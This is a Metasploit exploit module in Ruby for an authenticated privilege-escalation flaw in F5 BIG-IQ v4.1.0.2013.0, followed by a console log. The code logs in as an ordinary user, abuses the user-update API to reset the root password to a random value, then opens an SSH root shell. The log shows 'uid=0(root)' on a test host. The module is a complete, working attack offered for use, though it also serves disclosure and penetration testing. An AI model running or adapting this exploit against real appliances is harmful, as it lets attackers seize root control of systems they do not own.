# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;json&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "F5 BIG-IQ v4.1.0.2013.0 authenticated arbitrary user password change",
      &#039;Description&#039;    => %q{
      F5 BIG-IQ v4.1.0.2013.0 is vulnerable to a privilege escalation attack which allows
      an attacker to change the root users password. This module does just this, then SSH&#039;s in.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Brandon Perry <bperry.volatile@gmail.com>&#039;
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://volatile-minds.blogspot.com/2014/05/f5-big-iq-v41020130-authenticated.html&#039;]
        ],
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;BIG-IQ 4.1.0.2013.0&#039;, {}]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DefaultOptions&#039;  =>
      {
        &#039;SSL&#039; => true,
        &#039;ExitFunction&#039; => "none"
      },
      &#039;Payload&#039;        =>
      {
        &#039;Compat&#039; => {
          &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
          &#039;ConnectionType&#039; => &#039;find&#039;
        }
      },
      &#039;DisclosureDate&#039; => "Sep 23 2013",
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
        [
          Opt::RPORT(443),
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable instance&#039;, &#039;/&#039;]),
          OptString.new(&#039;USERNAME&#039;, [true, &#039;The user to authenticate as.&#039;, &#039;username&#039;]),
          OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to authenticate with.&#039;, &#039;password&#039;]),
          OptString.new(&#039;ADMINISTRATOR&#039;, [true, &#039;The administrator to spoof for privilege escalation&#039;, &#039;root&#039;]),
          OptInt.new(&#039;SSH_TIMEOUT&#039;, [ false, &#039;Specify the maximum time to negotiate a SSH session&#039;, 30])
        ], self.class)
  end
 
  def exploit
    post = {
      &#039;username&#039; => datastore[&#039;USERNAME&#039;],
      &#039;passwd&#039; => datastore[&#039;PASSWORD&#039;]
    }
 
    print_status("Authenticating as " + datastore[&#039;USERNAME&#039;])
 
    #Simple post to get us a cookie so we can change our password
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => &#039;/ui/actions/logmein.html&#039;,
      &#039;vars_post&#039; => post
    })
 
    if res.headers["Location"] != "/"
      fail_with("Authentication failed")
    end
 
    cookie = res.get_cookies
 
    #this gets turned into JSON
    #
    #generation will be set in try_generation if it isn&#039;t correct
    #
    post = {
      "name" => datastore[&#039;ADMINISTRATOR&#039;],
      "displayName" => "fdsa",
      "generation" => 1,
      "lastUpdateMicros" => 1395360806678747,
      "kind" => "shared:authz:users:usersworkerstate",
      "selfLink" => "https://localhost/mgmt/shared/authz/users/" + datastore[&#039;USERNAME&#039;],
      "password" => datastore[&#039;PASSWORD&#039;],
      "password2" => datastore[&#039;PASSWORD&#039;],
      "state" => "ACTIVE"
    }
 
    print_status("Escalating privileges to that of " + datastore["ADMINISTRATOR"])
 
    try_generation(post, cookie, &#039;/mgmt/shared/authz/users/&#039; + datastore[&#039;USERNAME&#039;])
 
    password = Rex::Text.rand_text_alpha(rand(32)+5)
 
    #this is when we change the password for the root user
    post = {
      "name" => "root",
      "displayName" => "root",
      "generation" => 1,
      "lastUpdateMicros" => 1395359570236413,
      "kind" => "shared:authz:users:usersworkerstate",
      "selfLink" => "https://localhost/mgmt/shared/authz/users/root",
      "password" => password,
      "password2" => password,
      "state" => "ACTIVE"
    }
 
    select(nil,nil,nil,5)
    print_status("Changing root user password to " + password)
 
    try_generation(post, cookie, &#039;/mgmt/shared/authz/users/root&#039;)
 
    res = do_login(&#039;root&#039;, password)
 
    if res
      print_good("Login Successful with &#039;root:#{password}&#039;")
      handler(res.lsock)
    end
  end
 
  def try_generation(put, cookie, uri)
    done = false
    while !done
      res = send_request_cgi({
        &#039;method&#039; => "PUT",
        &#039;uri&#039; => uri,
        &#039;data&#039; => put.to_json,
        &#039;cookie&#039; => cookie
      })
 
      if res and res.body =~ /Invalid generation/
        put[&#039;generation&#039;] = /Need (\d{1,9}), received \d{1,9}/.match(res.body)[1]
      elsif res and res.body =~ /encryptedPassword/
        done = true
      else
        fail_with("Didn&#039;t get a response that I expected")
      end
    end
  end
    def do_login(user, pass)
 
      opts = {
        :auth_methods => [&#039;password&#039;, &#039;keyboard-interactive&#039;],
        :msframework  => framework,
        :msfmodule    => self,
        :port         => 22,
        :disable_agent => true,
        :config => true,
        :password => pass,
        :record_auth_info => true,
        :proxies => datastore[&#039;Proxies&#039;]
      }
 
      opts.merge!(:verbose => :debug) if datastore[&#039;SSH_DEBUG&#039;]
 
      begin
        ssh = nil
        ssh = Net::SSH.start(datastore[&#039;RHOST&#039;], user, opts)
      rescue Rex::ConnectionError, Rex::AddressInUse
        return nil
      rescue Net::SSH::Disconnect, ::EOFError
        print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
        return nil
      rescue ::Timeout::Error
        print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
        return nil
      rescue Net::SSH::AuthenticationFailed
        print_error "#{rhost}:#{rport} SSH - Failed authentication"
        return nil
      rescue Net::SSH::Exception => e
        print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
        return nil
      end
      if ssh
        conn = Net::SSH::CommandStream.new(ssh, &#039;/bin/sh&#039;, true)
        return conn
      end
      return nil
    end
end
 
 
__END__
 
msf exploit(f5_bigiq_passwd_update) > show options
 
Module options (exploit/linux/http/f5_bigiq_passwd_update):
 
Name           Current Setting  Required  Description
----           ---------------  --------  -----------
ADMINISTRATOR  root             yes       The administrator to spoof for privilege escalation
PASSWORD       notpassword      yes       The password to authenticate with.
Proxies                         no        Use a proxy chain
RHOST          192.168.1.8      yes       The target address
RPORT          443              yes       The target port
SSH_TIMEOUT    30               no        Specify the maximum time to negotiate a SSH session
TARGETURI      /                yes       The URI of the vulnerable instance
USERNAME       username         yes       The user to authenticate as.
VHOST                           no        HTTP server virtual host
 
 
Payload options (cmd/unix/interact):
 
Name  Current Setting  Required  Description
 
----  ---------------  --------  -----------
 
Exploit target:
 
Id  Name
--  ----
0   a
 
 
msf exploit(f5_bigiq_passwd_update) > exploit
 
[+] Login Successful with &#039;root:qBvBY&#039;
[*] Found shell.
[*] Command shell session 3 opened (192.168.1.31:58165 -> 192.168.1.8:22) at 2014-03-20 21:18:09 -0500
 
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=root:system_r:unconfined_t:SystemLow-SystemHigh

